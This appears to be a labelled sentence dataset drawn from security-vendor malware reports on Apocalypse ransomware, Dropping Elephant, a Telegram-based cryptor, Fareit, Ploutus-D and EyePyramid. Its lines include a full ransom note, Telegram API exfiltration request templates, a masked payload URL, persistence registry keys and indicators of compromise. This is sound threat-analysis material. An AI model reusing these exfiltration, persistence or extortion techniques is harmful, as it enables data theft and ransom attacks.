2064	To encrypt a file, the ransomware first checks whether it is encrypted already by comparing the first four bytes of the file against the magic value: 0xD03C2A77.	1
2065	If the file is not encrypted already then it will encrypt the content of the file in memory using a custom XOR based algorithm: Example of a Apocalypse encryption loop The exact algorithm varies slightly from variant to variant.	0
2066	The magic value and encrypted content will then be written to the file and SecureCrypted is added to the filename.	0
2067	Before closing it, the original file timestamps will be restored and the following ransom note is created for the file: A L L Y O U R F I L E S A R E E N C R Y P T E D All your data – documents, photos, videos, backups – everything is encrypted.	0
2068	The only way to recover your files: contact us to the next email: [email protected] Attach to e-mail: 1.	0
2069	Text file with your IP server as Subject (To locate your encryption algoritm) 2.	0
2070	1-2 encrypted files (please dont send files bigger than 1 MB) We will check the encrypted file and send to you an email with your Decrypted FILE as proof that we actually have the decrypter software.	0
2071	Remember: 1.	0
2072	The FASTER you’ll CONTACT US – the FASTER you will RECOVER your files.	0
2073	2.	0
2074	We will ignore your e-mails without IP server number in Subject.	0
2075	3.	0
2076	If you haven’t received reply from us in 24 hours – try to contact us via public e-mail services such as Yahoo or so.	0
2077	The ransomware also creates a window which it displays to the user with a similar ransom note: The screen that the ransomware displays to the user One interesting aspect of this screen is that within the code which creates it, the ransomware author hid messages to Emsisoft: The Apocalypse developer insults “emissoft” As before, we see messages like this as validation of our work and consider it a backwards compliment.	0
2078	How can I decrypt my files encrypted by this ransomware?	0
2079	As for many other ransomware families, Emsisoft provides a free decrypter to all Apocalypse victims that allows them to decrypt their files for free.	0
2080	The Emsisoft Apocalypse decrypter at work The decrypter is available for download at our Emsisoft Decrypter portal here.	0
2081	How can I protect myself?	0
2082	Due to the nature of the attack protection software is rather ineffective.	0
2083	If the attacker manages to get access to the system via remote control, they can simply disable any protection software installed or add the malware to the protection software’s exclusion list.	0
2084	It therefore is imperative to prevent the attacker from gaining access to the system to begin with.	0
2085	The most important line of defense is a proper password policy that is enforced for all user accounts with remote access to the system.	0
2086	This does apply to rarely used accounts created for testing purposes or by applications as well.	0
2087	Even better would be to disable Remote Desktop or Terminal Services completely if not required or at least to use IP address based restrictions to allow the access to these services from trusted networks only.	0

2095	The Dropping Elephant actor | Securelist Solutions for: Kaspersky Menu Securelist English APT reports The Dropping Elephant – aggressive cyber-espionage in the Asian region By GReAT on July 8 2016.	0
2096	5:57 am Dropping Elephant (also known as “Chinastrats” and “Patchwork“) is a relatively new threat actor that is targeting a variety of high profile diplomatic and economic targets using a custom set of attack tools.	1
2097	Its victims are all involved with China’s foreign relations in some way, and are generally caught through spear-phishing or watering hole attacks.	0
2098	Overall, the activities of this actor show that low investment and ready-made offensive toolsets can be very effective when combined with high quality social engineering.	0
2099	We have seen more such open source toolset dependency with meterpreter and BeEF, and expect to see this trend continue.	0
2100	The Attack Method: Infection Vector Dropping Elephant uses two main infection vectors that share a common, and fairly elaborately maintained, social engineering theme – foreign relations with China.	0
2101	The first approach involves spear-phishing targets using a document with remote content.	0
2102	As soon as the user opens the document, a “ping” request is sent to the attackers’ server.	0
2103	At this point, the attackers know the user has opened the document and send another spear-phishing email, this time containing an MS Word document with an embedded executable.	0
2104	The Word document usually exploits CVE-2012-0158.	1
2105	Sometimes the attackers send an MS PowerPoint document instead, which exploits CVE-2014-6352.	1
2106	Once the payload is executed, an UPX packed AutoIT executable is dropped.	1
2107	Upon execution, this downloads additional components from the attackers’ servers.	0
2108	Then the stealing of documents and data begins.	0
2109	The second approach involves capturing victims through watering hole attacks.	0
2110	The actor created a website that downloads genuine news articles from other websites.	0
2111	If a website visitor wants to view the whole article they would need to download a PowerPoint document.	0
2112	This reveals the rest of the article, but also asks the visitor to download a malicious artifact.	0
2113	The two main infection vectors are supported by other approaches.	0
2114	Sometimes, the attackers email out links to their watering hole websites.	0
2115	They also maintain Google+, Facebook and twitter accounts to develop relevant SEO and to reach out to wider targets.	0
2116	Occasionally, these links get retweeted, indiscriminately bringing more potential victims to their watering holes.	0
2117	The Attack Tools 1.	0
2118	Malware Analysis The backdoor is usually UPX packed but still quite large in size.	0
2119	The reason for this is that most of the file comprises meaningless overlay data, since the file is an automatically generated AutoIT executable with an AutoIT3 script embedded inside.	0
2120	Once started, it downloads additional malware from the C2 and also uploads some basic system information, stealing, among other things, the user’s Google Chrome credentials.	0
2121	The backdoor also pings the C2 server at regular intervals.	0
2122	A good security analyst can spot this while analyzing firewall log files and thereby find out that something suspicious might be going on in the network.	0
2123	Generally speaking, backdoors download additional malware in the form of encrypted or packed executables/libraries.	0
2124	But, in the case of Dropping Elephant, the backdoor downloads encoded blobs that are then decoded to powershell command line “scripts”.	0
2125	These scripts are run and, in turn download the additional malware.	0
2126	One of the more interesting malware samples downloaded is the file-stealer module.	0
2127	When this file-stealer is executed, it makes another callback to the C2 server, downloading and executing yet another malware sample.	0
2128	It repeatedly attempts to iterate through directories and to collect files with the following extensions: doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, and pdf.	1
2129	These files are then uploaded to the C2 server.	0
2130	Also interesting are the resilient communications used by this group.	0
2131	Much like the known actors Miniduke or CommentCrew, it hides base64 encoded and encrypted control server locations in comments on legitimate web sites.	1
2132	However, unlike the previous actors, the encrypted data provides information about the next hop, or the TRUE C2 for the backdoor, instead of initial commands.	0
2133	2.	0
2134	C2 Analysis In many cases it was very difficult to get a good overview of the campaign and to find out how successful it is.	0
2135	By combining KSN data with partner-provided C2 server data, we were able to obtain a much fuller picture of the incident.	0
2136	We examined connections and attack logins to this particular C2.	0
2137	As it turned out, the attackers often logged in via a VPN, but sometimes via IPs belonging to an ordinary ISP in India.	0
2138	We then looked at the time the attackers were active, of which you can find an image below.	0
2139	Victim Profile and Geography We also wanted to get a better idea of the geolocation of most visitors.	0
2140	Analysis of the image provided access counts and times, along with the IP of the visiting system.	0
2141	Noteworthy are the many IPs located in China.	0
2142	This focus on China-related foreign relations was apparent from the ongoing social engineering themes that were constant throughout the attacks.	0
2143	The concentration of visits from CN (People’s Republic of China) could be for a variety of reasons – diplomatic staff are visiting these sites from their CN offices, CN academics and analysts are very interested in researching what they believe to be CN-focused think tanks, or some of the IPs are unknown and not self-identifying as bots or scrapers.	0
2144	Regardless, because we were able to determine that multiple targets are diplomatic and governmental entities, these foreign relations efforts are likely to represent the main interest of the attackers.	0
2145	Conclusion Campaigns do not always need to be technically advanced to be successful.	0
2146	In this case, a small group reusing exploit code, some powershell-based malware and mostly social engineering has been able to steal sensitive documents and data from victims since at least November 2015.	0
2147	Our analysis of the C2 server confirmed the high profile of most victims, mainly based in the Asian region and specially focused on Chinese interests.	0
2148	Actually, some hints suggest the group has been successful enough to have recently expanded its operations, perhaps after proving its effectiveness and the value of the data stolen.	0
2149	This is quite worrying, especially given the fact that no 0 days or advanced techniques were used against such high profile targets.	0
2150	Simply applying software patches will prevent attacks based on old exploits, as well as training in the most basic social engineering attacks.	0
2151	However, it should be noted that in this case Microsoft´s patch for exploit CVE-2014-1761 just warns the user not to allow the execution of the suspicious file.	0
2152	Dropping Elephant artifacts are detected by Kaspersky Lab products as: Exploit.Win32.CVE-2012-0158.	1
2153	* Exploit.MSWord.CVE-2014-1761.	1
2154	* Trojan-Downloader.Win32.Genome.	1
2155	* HEUR:Trojan.Win32.Generic As usual Kaspersky Lab actively collaborates with CERTs and LEAs to notify victims and help to mitigate the threat.	0
2156	If you need more information about this actor, please contact intelreports@kaspersky.com More information on how Kaspersky Lab technologies protect against such cyberespionage attacks is available on Kaspersky Business blog.	0

2187	The first cryptor to exploit Telegram | Securelist Solutions for: Kaspersky Menu Securelist English Mobile threats The first cryptor to exploit Telegram By Anton Ivanov, Fedor Sinitsyn on November 8 2016.	0
2188	10:52 am Contents Earlier this month, we discovered a piece of encryption malware targeting Russian users.	0
2189	One of its peculiarities was that it uses Telegram Messenger’s communication protocol to send a decryption key to the threat actor.	0
2190	To our knowledge, this is the first cryptor to use the Telegram protocol in an encryption malware case.	0
2191	What is a cryptor?	0
2192	In general, cryptors can be classified into two groups: those which maintain offline encryption and those which don’t.	0
2193	There are several reasons why file encryption malware requires an Internet connection.	0
2194	For instance, the threat actors may send an encryption key to the cryptor and receive data from it which they can later use to decrypt the victim’s encrypted files.	0
2195	Obviously, a special service is required on the threat actor’s side to receive data from the cryptor malware.	0
2196	That service must be protected from third-party researchers, and this creates extra software development costs.	0
2197	Analyzing the Telegram Trojan The Telegram Trojan is written in Delphi and is over 3MB in size.	0
2198	After launching, it generates a file encryption key and an infection ID (infection_id).	1
2199	Then it contacts the threat actors using the publicly available Telegram Bot API and operates as a Telegram bot, using the public API to communicate with its creators.	0
2200	In order for that to happen, the cybercriminals first create a “Telegram bot”.	0
2201	A unique token from the Telegram servers identifies the newly-created bot and is placed into the Trojan’s body so it can use the Telegram API.	0
2202	The Trojan then sends a request to the URL https://api.telegram.org/bot<token>/GetMe, where <token> the unique ID of the Telegram bot, created by the cybercriminals, is stored.	1
2203	According to the official API documentation, the method ‘getMe’ helps to check if a bot with the specified token exists and finds out basic information about it.	0
2204	The Trojan does not use the information about the bot that the server returns.	0
2205	The Trojan sends the next request using the method ‘sendMessage’ which allows the bot to send messages to the chat thread of the specified number.	0
2206	The Trojan then uses the chat number hardwired into its body, and sends an “infection successful” report to its creators: https://api.telegram.org/bot<token>/sendmessage?chat_id=<chat>&text=<computer_name>_<infection_id>_<key_seed> The Trojan sends the following parameters in the request: <chat> – number of the chat with the cybercriminal; <computer_name> – name of the infected computer; <infection_id> – infection ID; <key_seed> – number used as a basis to generate the file encryption key.	1
2207	After sending the information, the Trojan searches the hard drives for files with specific extensions, and encrypts them bytewise, using the simple algorithm of adding each file byte to the key bytes.	0
2208	File extensions selected for encryption Depending on its configuration, the Trojan may add the extension ‘.Xcri’ to the encrypted files, or leave the extension unchanged.	1
2209	The Trojan’s sample that we analyzed does not change file extensions.	0
2210	A list of encrypted files is saved to the text file ‘%USERPROFILE%\Desktop\База зашифр файлов.txt’.	1
2211	After encryption, the Trojan sends the request https://api.telegram.org/bot<token>/sendmessage?chat_id=<chat>&text=<computer_name>_<infection_id>_<key_seed>stop.	1
2212	In this request, all parameters are the same as in the previous request, but the word ‘stop’ is added at the end.	0
2213	Then the Trojan downloads the extra module Xhelp.exe (URL: http://***.ru/wp-includes/random_compat/Xhelp.exe) from a compromised site created using WordPress, and launches it.	1
2214	This module, called “Informer” (‘Информатор’ in the original Russian) by the cybercriminals, has a graphical interface and informs the victim about what has happened, and puts forward the ransom demand.	1
2215	The ransom is 5 RUB which is accepted via Qiwi or Yandex.Money payment methods.	1
2216	Screens demonstrated to the victim user The victim can communicate with the cybercriminals via a dedicated entry field in the “Informer” interface.	0
2217	This feature is also based on sending a Telegram message using the method ‘sendMessage’.	0
2218	Multiple language mistakes in the ransom texts suggest the grade level of the Trojan’s creators.	0
2219	There is also a final phrase which catches the attention: “Thank you for helping Young Programmers Fund”.	0
2220	Safeguarding measures All Kaspersky Lab products detect this threat with the following verdicts: Trojan-Ransom.Win32.TelecryptPDM:Trojan.Win32.Generic MD5: 3e24d064025ec20d6a8e8bae1d19ecdb – Trojan-Ransom.Win32.Telecrypt.a (the main module)14d4bc13a12f8243383756de92529d6d – Trojan-Ransom.Win32.Telecrypt.a (the ‘Informer’ module).	1
2221	If you have fallen victim to this encryption malware, we strongly advise you not to pay the ransom.	0
2222	Instead, contact Kaspersky Lab’s support team and we will help you decrypt your files.	0

2230	Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: Fareit Spam: Rocking Out to a New File Type Tuesday, November 22 2016 Fareit Spam: Rocking Out to a New File Type This post authored by Nick Biasini Talos is constantly monitoring the threat landscape including the email threat landscape.	0
2231	Lately this landscape has been dominated with Locky distribution.	0
2232	During a recent Locky vacation Talos noticed an interesting shift in file types being used to distribute another well known malware family, Fareit.	0
2233	We've discussed Fareit before, it's a trojan used to steal credentials and distribute multiple different types of malware.	0
2234	The focus of this post will not be on Fareit but on a new way attackers are working to distribute it via email.	0
2235	Locky has been a case study in how to leverage different file extensions in email to distribute malware.	0
2236	The use of various file types such as .js, .wsf, and .hta have been used quite successfully for Locky.	0
2237	We've already noted other threats making use of .js for distribution largely due to Locky's success.	0
2238	Recently we observed another uncommon file type associated with email and decided to dig a little further on the infection chain.	0
2239	Email Campaign This investigation started with the identification of an uncommon file type, .mht.	0
2240	MHT files, also referred to as .mhtml files, are MIME HTML files.	0
2241	These files are commonly created when trying to save a document or other content as a web page.	0
2242	MHT files can be created using various types of applications including web browsers and word processors.	0
2243	In this case we found a small spam campaign purporting as a billing payment document from HSBC.	0
2244	They also made sure to include some security tips in the email including not opening attachments from unknown or unverified senders.	0
2245	Ironically if a user were to follow these instructions they would have avoided potential infection.	0
2246	Talos started analyzing the .mht file and found a couple of interesting tidbits.	0
2247	First thing of note was a reference to a .hta file.	0
2248	HTA or HTML Application files have been used periodically in the last six months during Locky campaigns and just like .js can be leveraged to execute natively on Microsoft Windows.	0
2249	This file was being hosted on a compromised website.	0
2250	Next after some further analysis there is an odd musical reference in the file details.	0
2251	The mht files have a section that is dedicated to identifying things like Author information, versioning, and company information.	0
2252	It's in this section that Talos found a reference to the band Deftones.	0
2253	This is just another weird tidbit that we find from time to time in malware threats, similar to the PUMPKIN theme of a recent locky campaign.	0
2254	Talos continued down the infection path by analyzing the .hta file that was being hosted.	0
2255	The first step is going and pulling the questionable file down.	0
2256	This is where Talos found the first hurdle commonly associated with threat analysis.	0
2257	To their credit the compromised website was cleaned up quickly and effectively and the file in question was no longer available.	0
2258	However, that doesn't help the people that were compromised during the time when the files were available.	0
2259	Hunting Threats Post Mortem Talos was placed in a situation where there was a threat that was once active but had been cleaned up.	0
2260	This is a common problem and provides an opportunity to demonstrate how data and threat intelligence can be used to find the missing links and rebuild the infection chain.	0
2261	In this particular case we had URL pointing to an hta file that no longer existed.	0
2262	We were able to find instances of the file being blocked from being downloaded.	0
2263	Normally that would not be particularly interesting, but in this case we were able to find a file hash (a95a01472fdb42a123e1beb6332cb42c9372fdfe33066b94a7cabdac3d78efe1).	1
2264	We then started searching through various data sources for the file in question and found it in multiple locations including VirusTotal.	0
2265	As you can see the filename correlates as does the analysis date.	0
2266	Talos then obtained the file and continued analysis.	0
2267	The file in question, as shown below, was actually just a vbscript that was used to pull yet another file.	0
2268	This file was being hosted on the same compromised website, and therefore was gone.	0
2269	In this particular instance we didn't have as much information available on the file and were left with only the URL path and filename.	0
2270	We were able to leverage the domain known to be distributing the file to again find the files in question.	0
2271	Using the same techniques described earlier we were able to continue to hunt the threat, initially searching based upon URL in question and finally located another file hash, 27689bcbab872e321f4c9f9b5b01a6c7e1eca0ee7442afc80c5af48e62d3c5f3.	1
2272	Finally, we were able to analyze the final payload to determine this in fact Fareit being distributed via these .mht files.	1
2273	This completed the infection chain and identified the TRUE purpose of this particular spam campaign.	0
2274	IOC Email Subject: BILL PAYMENT ADVICE Our Ref: <RANDOM STRING> Counterparty: Your Ref: Hashes: a95a01472fdb42a123e1beb6332cb42c9372fdfe33066b94a7cabdac3d78efe1 (File.hta) 27689bcbab872e321f4c9f9b5b01a6c7e1eca0ee7442afc80c5af48e62d3c5f3 (j.exe) d60bb9655a98b4fdb712162c75298ab6364951b1fc085131607f5073857b0ddc (.mht File) C2 Domain: jerryotis[.]pw Conclusion This is yet another example of adversary evolution.	1
2275	As security products continue to evolve and users get smart to various file types, adversaries will keep changing to get users infected.	0
2276	In this particular instance you can see a couple relatively uncommon file types being leveraged.	0
2277	First, the mhtml file that is provided as an email attachment.	0
2278	This file then grabs another uncommon filetype hta.	0
2279	Hta files are more common now, thanks largely to Locky leveraging it in various spam campaigns.	0
2280	Regardless of the filetype the end result is the same, a compromised system.	0
2281	This particular campaign also provides an example of how hunting threats doesn't necessarily end when the site gets taken down or fixed.	0
2282	In this case it shows how you can still figure out an attack even when everything appears to already be dead.	0
2283	In today's world threat intelligence is of utmost importance and this is a key reason why.	0
2284	Simply by leveraging intelligence information and data sources Talos was able to find all necessary files to recreate the infection chain.	0
2285	In today's multi-hundred million or billion dollar industry of crimeware adversaries are always looking for new and effective ways to infect users.	0
2286	This small scale use of .mht files could just be a test run and will likely start showing up in larger volumes, if found to be effective by the bad guys.	0
2287	Coverage Additional ways our customers can detect and block this threat are listed below.	0
2288	Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.	0
2289	CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.	0
2290	The Network Security protection of IPS and NGFW have up-to-date signatures to detect malicious network activity by threat actors.	0
2291	Email Security can block malicious emails sent by threat actors as part of their campaign.	0

2296	Find out more on how we use cookies.Accept Decline Threat Research New Variant of Ploutus ATM Malware Observed in the Wild in Latin America January 11 2017 | by Daniel Regalado | Advanced Malware Malware Advanced Malware Introduction Ploutus is one of the most advanced ATM malware families we’ve seen in the last few years.	0
2297	Discovered for the first time in Mexico back in 2013 Ploutus enabled criminals to empty ATMs using either an external keyboard attached to the machine or via SMS message, a technique that had never been seen before.	0
2298	FireEye Labs recently identified a previously unobserved version of Ploutus, dubbed Ploutus-D, that interacts with KAL’s Kalignite multivendor ATM platform.	1
2299	The samples we identified target the ATM vendor Diebold.	0
2300	However, minimal code change to Ploutus-D would greatly expand its ATM vendor targets since Kalignite Platform runs on 40 different ATM vendors in 80 countries.	0
2301	Once deployed to an ATM, Ploutus-D makes it possible for a money mule to obtain thousands of dollars in minutes.	0
2302	A money mule must have a master key to open the top portion of the ATM (or be able to pick it), a physical keyboard to connect to the machine, and an activation code (provided by the boss in charge of the operation) in order to dispense money from the ATM.	0
2303	While there are some risks of the money mule being caught by cameras, the speed in which the operation is carried out minimizes the mule’s risk.	0
2304	This blog covers the changes, improvements, and Indicators of Compromise (IOC) of Ploutus-D in order to help financial organizations identify and defend against this threat.	0
2305	Previously unobserved features of Ploutus-D Commonality between Ploutus and Ploutus-D Dissecting Ploutus-D Ploutus-D (observed in the wild with the filename of “AgilisConfigurationUtility.exe”) can run as a standalone application or as a Windows service started by a Launcher (observed in the wild as “Diebold.exe”).	1
2306	Although multiple functionality is shared between the two components, the main difference is that Ploutus-D is the component with the capability to dispense money.	0

2311	The Launcher can receive different arguments in the command line to either install as a service, run Ploutus-D, or uninstall from the machine.	0
2312	The service properties can be seen in Figure 2.	0
2313	Figure 2: Service Description of the Launcher Persistence Using a very common persistence technique, the malware will add itself to the “Userinit” registry key to allow execution after every reboot.	1
2314	The key is located at: \HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit Interacting with the Launcher The attacker must interact with the Launcher by attaching a keyboard to the ATM USB or PS/2 port.	1
2315	Figure 3 below shows an example of this setup.	0
2316	Figure 3: Keyboard attached to the ATM port Once the Launcher has been installed in the ATM, it will perform keyboard hooking in order to read the instructions from the attackers via the external keyboard.	0
2317	A combination of “F” keys will be used to request the action to execute (see Figure 4).	0
2318	Figure 4: Interacting with the Launcher via keyboard The main tasks supported are: As seen in Figure 5 a request has been sent to run Ploutus-D (AgilisConfigurationUtility.exe) from command line.	1
2319	Figure 5: Starting Ploutus-D by the Launcher Legitimate KAL ATM software is dropped into the system along with Ploutus-D, as shown in the Figure 6.	0
2320	The reason for this is to make sure that all the software and versions needed to properly run the malware are present in the same folder to avoid any dependency issues.	0
2321	The same technique was also used by the first version of Ploutus.	0
2322	Figure 6: Dropped files by the Launcher The K3A.Platform.dll DLL will load the Kalignite Platform to allow Ploutus-D to control the ATM.	1
2323	This shows that the attackers likely have access to the targeted ATM software.	0
2324	They can either buy physical ATMs from authorized resellers, which come preloaded with vendor software, or they could just steal the ATMs directly from the bank’s facility.	0
2325	An example of a real incident reported in Mexico is shown in Figure 7.	0
2326	Figure 7: Attackers physically stealing ATMs Ploutus-D – AgilisConfigurationUtility.exe (.NET) MD5 5AF1F92832378772A7E3B07A0CAD4FC5 .NET Obfuscator Reactor File Size 274 kB File Type Win32 EXE Time Stamp 1992:06:19 15:22:17-07:00 Code Size 29696 OS Version 4.0 Image Version 0.0 Subsystem Version 4.0 Table 2: Ploutus-D Properties Similar to the Launcher, this binary also came protected with Reactor obfuscator (see Figure 8).	1
2327	Figure 8.	0
2328	Protected with Reactor Looking at the unprotected code (see Figure 9), the connection with Ploutus became evident since the names of most of the functions are the same as in the first version.	0
2329	Figure 9: Unprotected code Ploutus-D will make sure a mutex with the name “KaligniteAPP” does not exist in the system in order to start running.	1
2330	Similar to the Launcher, Ploutus-D will hook the keyboard in order for the attackers to interact with it; however, apart from receiving commands from “F” keys, it will also read from the numeric pad (numbers).	0
2331	Similar to the previous version, the GUI will be enabled by entering a combination of “F” keys.	0
2332	Then, a valid 8-digit code must be entered in the GUI in order to be able to dispense money.	0
2333	Ploutus-D also allows the attackers to enter the amount to withdraw (billUnits – 4 digits) and the number of cycles (billCount – 2 digits) to repeat the dispensing operation (see Figure 10).	0
2334	Figure 10: Parsing amount and cycles The Ploutus-D GUI is displayed in Figure 11.	0
2335	It is configured to list properties of 18 cassettes (C1-C18).	0
2336	Letter “D” shows the status of the cassette and “CV” is a value taken from the registry.	0
2337	The message “Estado:Activado”, which means “State: Activated”, is displayed if a valid code has been entered.	0
2338	The ATM ID and HW_ID are unique to the ATM.	0
2339	The amount to be retrieved is displayed as: “Cantidad: 500” (default value if no amount entered in the GUI).	0
2340	The total amount depends on the currency, which is also calculated by the malware.	0
2341	Figure 11: Ploutus-D GUI enabled All the actions are logged into a file with the name “Log.txt”.	1
2342	An extract can be seen in Figure 12.	0
2343	Figure 12: Log File recording actions Dispensing the Money In order for the mule to be able to start dispensing money, a valid 8-digit code must be entered.	0
2344	This code is provided by the boss in charge of the operation and is calculated based on a unique ID generated per ATM, and the current month and day of the attack.	0
2345	Once a valid activation code has been entered (which expires in 24 hours), the dispensing process will start by pressing “F3” from the external keyboard.	0
2346	The malware will first identify the cassette’s denomination by querying the registry denomination table from Diebold Dispenser Logical Name “DBD_AdvFuncDisp” at: \HKLM\SOFTWARE\XFS\PHYSICAL_SERVICES\DBD_AdvFuncDisp\Denomination Table A similar strategy will be used to get the cassette’s status and type, to make sure they are working properly, and, more important, to identify that it has at least one bill to withdraw.	1
2347	Ploutus-D will load “KXCashDispenserLib” library implemented by Kalignite Platform (K3A.Platform.dll) to interact with the XFS Manager and control the Dispenser (see Figure 13).	1
2348	Figure 13: Loading Dispenser Class Figure 14 shows a graphical representation of the XFS Manager and its interaction with Kalignite Platform via KXCashDispenserLib.	1
2349	Figure 14: XFS Manager The knowledge shown in the code to properly implement all the different classes and methods to control the Dispenser suggests that the developers of the malware have either access to real ATMs during the development or they hired individuals with experience coding on these machines.	0
2350	Expanding Ploutus to other ATM vendors Kalignite Platform is said to support 40 ATM vendors.	0
2351	Looking at the code to dispense money, the only pieces adjusted to target Diebold are the different registry keys to read the cassette (DBD_AdvFuncDisp) parameters (see Figure 15).	0
2352	Figure 15: Getting Diebold Cassette parameters Since Ploutus-D interacts with the Kalignite Platform, only minor modifications to the Ploutus-D code may be required to target different ATM vendors worldwide.	0
2353	Conclusion As anticipated in our 2017 predictions report, the use of ATM malware will continue to increase, especially in underdeveloped countries with weaker physical security controls.	0
2354	By leveraging the Kalignite Platform, Ploutus can be easily modified to attack various ATM vendors and operating systems.	0

2359	This case has been called “EyePyramid”, which we first discussed last week.	0
2360	(Conspiracy theories aside, the name came from a domain name and directory path that was found during the research.)	0
2361	The court order was published by AGI, an Italian news agency, around noon on January 11.	0
2362	It (surprisingly) contains multiple technical details which we used to bootstrap our initial analysis.	0
2363	This post builds on the details of the case to provide a more complete and in-depth view of the activities of this campaign.	0
2364	Scope of this analysis We have analyzed nearly 250 distinct samples, with new batches of EyePyramid-related samples seen and identified daily.	0
2365	Right after our initial analysis, about a dozen suspicious samples were uploaded to VirusTotal and tagged as “#eyepyramid”.	1
2366	We believe that these samples are “false flags,” because the samples do not resemble any of the samples that we were able to definitely relate to the EyePyramid case.	0
2367	Although we are not able to say with 100% certainty that there are no relationships between these “false flags” and the original EyePyramid samples, we purposely did not focus on these uploaded samples.	0
2368	Targeted Email Accounts Evidence from some of the samples suggests that the attackers targeted email accounts from various domains.	0
2369	Both account credentials and messages from these accounts were stolen, with email accounts from the following domains being targeted: The domains being targeted @alice.it @aol.com @att.net @badoo.com @bellsouth.net @bluewin.ch @btinternet.com @comcast.net @cox.net @cyh.com.tr @earthlink.net @eim.ae @email.com @email.it @emirates.net.ae @excite.it @facebook.com @facebookmail.com @fastweb.it @fastwebmail.it @fastwebnet.it @free.fr @gmail.com @gmail.it @gmx.de @gmx.net @googlegroups.com @googlemail.com @groupama.it @groups.facebook.com @gvt.net.br @hanmail.net @hinet.net @hotmail.co.uk @hotmail.com @hotmail.fr @hotmail.it @infinito.it @interbusiness.it @interfree.it @inwind.it @iol.it @jazztel.es @jumpy.it @katamail.com @laposte.net @legalmail.it @libero.it @live.com @live.it @lycos.com @lycos.it @mac.com @mail.bakeca.it @mail.com @mail.ru @mail.vodafone.it @mail.wind.it @mclink.it @me.com @msn.com @mtnl.net.in @nate.com @netscape.net @netzero.com @orange.fr @otenet.gr @poczta.onet.pl @poste.it @proxad.net @rediffmail.com @rocketmail.com @runbox.com @saudi.net.sa @sbcglobal.net @skynet.be @supereva.it @sympatico.ca @t-online.de @tele2.it @verizon.net @virgilio.it @vodafone.com @vodafone.it @vsnl.net.in @wanadoo.fr @web.de @yahoo.ca @yahoo.co.in @yahoo.co.jp @yahoo.co.uk @yahoo.com @yahoo.com.ar @yahoo.com.br @yahoo.com.mx @yahoo.de @yahoo.es @yahoo.fr @yahoo.it @yahoogroups.com @ymail.com Attack scheme The attack scheme features a remarkable pre-attack phase designed to create a foundation of trust for an effective spear-phishing campaign against high-profile targets.	0
2370	The attacker starts with a list of email accounts—obtained either from an out-of-band compromise, or by another case using the same malware.	0
2371	These accounts belong to organizations or persons that are supposedly trusted by the final, high-profile victim(s).	0
2372	Using these email accounts as senders, together with attachment names crafted to camouflage the original malware sample extension (*.exe), the attacker managed to infect the computers (directly or indirectly) used by the high-profile victims.	0
2373	When the malware files are executed on each machine it auto-updates itself, steals information related to email accounts matching the list above, and sends the harvested information to dropzone email addresses and/or C&C servers via HTTP/HTTPS.	0
2374	This also adds these email accounts to the attacker’s list of compromised accounts, which could be used to spread malware to other victims.	0
2375	Timeline and prevalence Using the compile time stamp, we obtained the following timeline, which is in line with other analyses that followed our initial report.	0
2376	EyePyramid’s known samples peaked in 2014 with more than three times the number of samples of any other year.	0
2377	Figure 1.	0
2378	Distribution of EyePyramid sample compilation date, by year While EyePyramid was based in Italy, not all of its victims were located in that country, as seen from the graph below: TOP 10 % Italy 14.77 United States 9.79 Japan 9.61 United Kingdom 5.87 Taiwan 4.45 Germany 4.27 France 3.20 India 2.14 Brazil 1.78 Austria 1.60 Others 42.52 Figure 2 and Table 1.	0
2379	Distribution of EyePyramid victims EyePyramid Malware Evolution After analysis, we were able to group the EyePyramid samples based on various features, including: Figure 3.	0
2380	Code for key capturing features These strings indicate that the malware incorporated various software components with specific features.	0
2381	For example, “iepv\Release\iepv.pdb” is the IE Password Viewer, a small utility (and library) which can be used to reveal passwords stored by Internet Explorer.	1
2382	Other components listed have similar features.	0
2383	The presence of these components suggests that one of the malware’s purposes is to exfiltrate browser-related data.	0
2384	The recurrent path string “:\projects\vs2005” also provides us clues about the malware author’s modus operandi.	1
2385	We found all of these strings in both a 2014 and 2015 variant, which both shared the file name vmgr.exe.	1
2386	This suggests that the author behind both samples is the same.	0
2387	However, these were not compiled with the same programming environment: the 2014 variant has been compiled with .NET 4.5.5416.41981, whereas the 2015 variant has .NET 4.5.5604.16127.	1
2388	Based on the above features, we generated a summary of the malware samples, which can be found in the appendix below.	0
2389	We can conclude that over time, the threat actors behind this crime modified and updated the malware’s capabilities (e.g., not all variants are able to exfiltrate Skype conversations), C&C and dropzones, compiler version, and protection mechanisms.	0
2390	Figure 4.	0
2391	Appendix with complete table (2010 – 2016) Link back to 2011 Bisignani spy case In 2012 a high-profile Italian businessman and ex-journalist named Luigi Bisignani was prosecuted as part of the “P4 secret society,” (short for Propaganda 4).	0
2392	The P4 was the fourth of the masonic lodges in Italy, which was supposedly influencing political decisions.	0
2393	The malware used in those attacks used several Gmail addresses as dropzones.	0
2394	Investigators at CNAIPIC (an Italian cybercrime body) found that these same addresses were used by recent EyePyramid variants as well.	0
2395	Independently, we found that older -2012 variants of EyePyramid were doing the same thing.	0
2396	One more interesting link that we found is the use of the mail.hospenta.com mailserver, which is similar to the one used by the recent versions of EyePyramid.	1
2397	Curiously, only the 2010 version—and not the 2012 version—used mail.hostpenta.com.	0
2398	Both the 2010 and 2012 versions share the infamous MN600-D8102F401003102110C5114F1F18-0E8C MailBee license key, which was either purchased by Giulio Occhionero, or purchased using his name.	1
2399	Main Features of EyePyramid Malware EyePyramid’s most important features are listed below.	0
2400	This list is not meant to be exhaustive, but it covers the most relevant ones.	0
2401	Persistency When first executed, the malware drops a copy of itself onto the hard drive (usually on the root folder C:\) using a name selected from random list, which is made up of: Figure 5.	1
2402	Possible “random” file names To maintain persistency, the malware uses a classic mechanism that involves modifying or adding entries to the CurrentVersion\Run and CurrentVersion\RunOnce registry keys.	1
2403	Figure 6.	0
2404	Autostart registry entries Setting the value of these entries to the path of the malware executable will ensure that it is executed upon every user logon.	0
2405	Code reuse: not all variants use the same combinations of libraries An interesting characteristic of the EyePyramid malware is the use of publicly known third-party components or open-source libraries, which provide clues to the technical skills of the author.	0
2406	The following libraries were found: File harvesting As we noted in our initial analysis, EyePyramid’s main feature is to harvest and steal files.	0
2407	Files with the following extensions are targeted: Figure 7.	0
2408	File extensions targeted for theft Among the other harvested data, EyePyramid looks for *.pst files, which are used by various applications including the Microsoft Exchange Client, Windows Messaging, and Microsoft Outlook to store copies of messages, calendar events and other similar information.	1
2409	Figure 8.	0
